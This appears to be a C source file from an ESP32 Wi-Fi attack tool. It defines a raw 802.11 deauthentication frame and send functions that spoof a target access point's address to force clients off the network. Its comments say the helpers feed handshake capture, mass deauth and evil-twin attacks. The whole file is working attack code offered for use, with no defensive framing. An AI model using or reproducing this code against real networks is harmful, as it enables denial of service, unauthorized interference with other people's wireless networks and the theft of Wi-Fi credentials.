// Shared deauthentication helpers: default frame template, mutable frame buffer,
// and send functions used by handshake capture, targeted deauth, deauth-all,
// and evil-twin loops.

#include "esp_wifi.h"

// --- Default deauth frame (802.11 management, subtype 0xC) ------------------
// Addr1 = broadcast, Addr2/Addr3 filled per-target, reason code 0x01.

static const uint8_t deauth_frame_default[] = {
	0xc0, 0x00, 0x3a, 0x01,             // Frame Control + Duration
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Addr1: broadcast
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2: source (set per-target)
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3: BSSID (set per-target)
	0xf0, 0xff, 0x02, 0x00              // Seq ctl + reason code
};

static uint8_t deauth_frame[sizeof(deauth_frame_default)];

// --- Send functions ----------------------------------------------------------

/**
 * @brief Send a raw 802.11 frame via the AP interface.
 * Wraps esp_wifi_80211_tx with error checking.
 * @param frame_buffer Pointer to the raw 802.11 frame bytes.
 * @param size Length of the frame in bytes.
 */
static void deauthSendRawFrame(const uint8_t *frame_buffer, int size) {
	ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

/**
 * @brief Send a deauth frame to a specific BSSID on a given channel.
 * Switches to the target channel, fills Addr2 and Addr3 with the
 *target BSSID (spoofing the AP), and transmits via deauthSendRawFrame.
 * @param bssid 6-byte MAC address of the target AP.
 * @param chan Wi-Fi channel (1-14 for 2.4 GHz).
 */
static void deauthSendFrame(const uint8_t* bssid, int chan) {
	esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
	delay(50);
	memcpy(&deauth_frame[10], bssid, 6); // Addr2 (source, spoofed as AP)
	memcpy(&deauth_frame[16], bssid, 6); // Addr3 (BSSID)
	deauthSendRawFrame(deauth_frame, sizeof(deauth_frame_default));
}
